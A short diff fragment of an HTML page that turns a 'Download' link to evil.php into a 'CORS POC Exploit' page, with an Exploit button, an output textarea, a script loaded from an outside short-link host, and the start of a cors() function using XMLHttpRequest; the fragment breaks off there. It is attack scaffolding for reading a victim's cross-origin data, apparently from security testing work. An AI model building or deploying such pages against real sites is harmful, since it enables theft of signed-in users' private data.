@@ -6,7 +6,11 @@
     <title>Document</title>
 </head>
 <body>
-    <a href="evil.php">Download</a>
+    <h2>CORS POC Exploit</h2>
+    <div id="demo">
+    <button type="button" onclick="cors()">Exploit</button>
+    <textarea id="resource" rows="10" cols="50"></textarea>
+    </div>
     <script src="https://js.rip/6xyv063zk8">
         function cors() {
         	const xhr = new XMLHttpRequest();
